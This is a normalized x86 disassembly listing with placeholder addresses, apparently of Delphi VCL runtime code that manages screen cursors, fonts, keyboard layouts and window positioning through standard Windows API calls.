mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4044a0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_457748
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_43d858
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_452ea4
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_43d81c
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403300
inc ebp
dec edi
jne r-xdata
sub_457794
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_43f5c4
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4577c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fdcc
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_4577e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_455b50
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_440b28
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_43f5c4
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_440b28
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_440b28
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43f5d8
or ecx 0xffffffff
mov dl 0x1
call sub_43a9e8
pop esi
pop ebx
retn
sub_457880
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44023c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_43b4f4
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_439cec
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403300
sub_4578d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45799e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43a2c0
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_403f44
mov eax [ ebp - 0x4 ]
call sub_404114
push eax
mov eax [ ebp - 0x4 ]
call sub_404314
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_43a2d0
mov eax [ ebp - 0x4 ]
call sub_404114
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43a37c
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4579a5
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_453780
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4044a0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_4579c4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43ffbc
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43f5c4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43f5d8
mov dl [ ebx + 0x57 ]
call sub_43a26c
inc edi
dec esi
jne r-xdata
sub_457a68
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_457a98
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_457ac8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419854
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_457e6c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_457e78
mov eax ebx
call sub_457e84
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_4542a0
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ca54
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ca54
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ca54
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_4582a4
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_458180
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_458180
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_458180
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_457c20
push ebx
push esi
push edi
push ebp
call sub_403490
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403104
mov eax [ ebp + 0x88 ]
call sub_403104
mov eax [ ebp + 0x84 ]
call sub_403104
mov eax [ ebp + 0x54 ]
call sub_403104
mov eax [ ebp + 0x50 ]
call sub_403104
mov eax [ ebp + 0x4c ]
call sub_403104
mov eax [ ebp + 0x30 ]
call sub_403104
mov eax [ ebp + 0x34 ]
call sub_403104
mov eax [ ebp + 0x7c ]
call sub_403104
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403104
mov eax ebp
call sub_457ee0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4198a0
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403478
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_413d6c
call sub_403104
inc edi
dec esi
jne r-xdata
sub_457d98
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_457de4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413c10
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413c10
mov eax [ rw-data ]
call sub_45ab70
sub_457e1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413eb0
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413eb0
mov eax [ rw-data ]
call sub_45ab70
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_44204c
sub_457e84
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_457f3c
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_457ee0
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026dc
mov ebx esi
test ebx ebx
jne r-xdata
sub_457f3c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_457f64
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45810f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458116
lea eax [ ebp - 0x260 ]
call sub_403e54
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403e54
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_415914
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408b60
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_4457f4
test al al
je r-xdata
xor eax eax
push ebp
push sub_4580cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4040c4
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4040c4
sub_458180
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_45a9e0
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45a794
mov dl 0x1
mov eax [ rw-data ]
call sub_45a794
sub_4581ec
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_458214
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_4581ec
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406840
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_4067c8
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4582a4
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4583e9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45a794
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41cde4
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41cde4
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41cec8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41cde4
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41cde4
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41cde4
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_45a794
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41cc28
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41cc28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4583f0
cmp [ rw-data ] 0x0
je r-xdata
sub_458428
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_458488
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_4585c4 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_458638
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_457d90
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_413d6c
mov dl [ ebp - 0x1 ]
call sub_458488
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_457d7c
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_413c10
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_413de8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_413d6c
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_458428
test al al
je r-xdata
inc esi
sub_458784
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_457d90
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_457d7c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_4587dc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_458784
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_458856
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_458638
pop ecx
push ebp
mov al 0x2
call sub_458638
pop ecx
push ebp
mov al 0x3
call sub_458638
pop ecx
push ebp
mov al 0x4
call sub_458638
pop ecx
push ebp
mov al 0x5
call sub_458638
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403104
retn
sub_458864
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4583f8
xor eax eax
push ebp
push sub_4588dd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4587dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_458400
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4588f8
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403e54
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403ea8
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_458950
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_458981
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_45ad9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
